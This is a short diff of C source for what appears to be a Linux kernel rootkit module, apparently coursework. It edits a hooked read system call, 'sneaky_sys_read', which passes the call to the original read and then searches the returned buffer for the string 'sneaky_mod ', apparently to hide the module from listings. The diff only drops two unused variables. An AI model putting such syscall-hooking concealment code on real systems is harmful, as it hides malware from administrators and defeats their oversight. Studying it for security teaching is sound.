@@ -56,9 +56,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
 }
 
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs){
-  int fd = (int)(regs->di);
   char * buffer = (char *)(regs->si);
-  int count = (int)(regs->dx);
   ssize_t bytes_read = original_read(regs);
   char * first  = strstr(buffer, "sneaky_mod ");
   int length;
